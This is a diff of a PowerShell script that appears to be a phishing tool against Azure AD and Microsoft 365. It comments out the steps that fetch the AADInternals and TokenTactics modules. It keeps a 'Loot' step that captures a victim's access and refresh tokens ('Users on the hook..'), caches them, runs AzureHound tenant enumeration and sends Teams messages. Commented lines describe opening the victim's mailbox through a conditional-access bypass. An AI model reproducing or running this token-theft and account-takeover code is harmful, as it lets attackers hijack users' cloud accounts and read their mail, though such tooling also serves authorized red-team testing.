@@ -7,38 +7,40 @@ param (
     [Parameter(ValueFromPipelineByPropertyName=$true)]
     [string]$subject,
     [Parameter(ValueFromPipelineByPropertyName=$true)]
-    [string]$Token
+    [string]$Token,
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [string]$template
 )
 
-# Check if AADInternals module is available
-if (-not (Get-Module -Name AADInternals -ListAvailable)) {
-    # Install the AADInternals module if it's not available
-    Install-Module AADInternals -Force
-    Write-Output "AADInternals module has been installed."
-}
+# # Check if AADInternals module is available
+# if (-not (Get-Module -Name AADInternals -ListAvailable)) {
+#     # Install the AADInternals module if it's not available
+#     Install-Module AADInternals -Force
+#     Write-Output "AADInternals module has been installed."
+# }
 
 # Import the AADInternals module
-Import-Module AADInternals -Force
-Write-Output "AADInternals module has been imported."
+# Import-Module AADInternals -Force
+# Write-Output "AADInternals module has been imported."
 
-# Check if TokenTactics module is available
-if (!(Get-Module -ListAvailable -Name TokenTactics)) {
-    # Download the latest TokenTactics zip if the module is not available
-    Write-Output "TokenTactics not found, downloading latest version into current working directory."
-    Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip
+# # Check if TokenTactics module is available
+# if (!(Get-Module -ListAvailable -Name TokenTactics)) {
+#     # Download the latest TokenTactics zip if the module is not available
+#     Write-Output "TokenTactics not found, downloading latest version into current working directory."
+#     Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip
 
-    if (Test-Path -Path .\tokentactics) {
-        Remove-Item -Path .\tokentactics -Recurse -Force
-    }
+#     if (Test-Path -Path .\tokentactics) {
+#         Remove-Item -Path .\tokentactics -Recurse -Force
+#     }
 
-    Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
-    Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
-    Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
-}
+#     Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
+#     Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
+#     Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
+# }
 
 # Import or re-import the TokenTactics module
-Import-Module .\tokentactics\TokenTactics.psd1 -Force
-Write-Output "TokenTactics module has been imported."
+# Import-Module .\tokentactics\TokenTactics.psd1 -Force
+# Write-Output "TokenTactics module has been imported."
 
 
 # Check if $Token has been specified and is not null or empty
@@ -56,7 +58,7 @@ if ([string]::IsNullOrWhiteSpace($Token)) {
 
 
 # Loot
-if(!($response)){ Read-Host "User didn't bite, try again."} else {
+if(!($response)){ Write-Host "Users on the hook.."} else {
 $access = $response.access_token
 $refresh = $response.refresh_token
 Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh
@@ -113,7 +115,7 @@ Write-Output "Cleaned up the downloaded zip file."
 
 # Run AzureHound with the specified parameters
 Write-Output "Running Azurehound."
-& $exePath -r $tok list --tenant $domain -o .\azurehound.json
+& $exePath -r $tok list --tenant $domain -o azurehound.json
 Write-Output "AzureHound command executed for $os."
 
 
@@ -263,6 +265,11 @@ if ($targetUser) {
 } else {
     Write-Host "No Teams user specified. Skipping message sending."
 }
+}
+
+
+
+
 
 # Open Mailbox in browser with Burp, paste into repeater
 # Write-Output "Would you like to open the user's mailbox in the browser?"
@@ -270,4 +277,3 @@ if ($targetUser) {
 # Write-Output "Microsoft patched part of the TokenTactics version, use these instruction for a workaround: https://labs.lares.com/owa-cap-bypass/"
 # Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
 # Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device iPhone -Browser Edge
-}
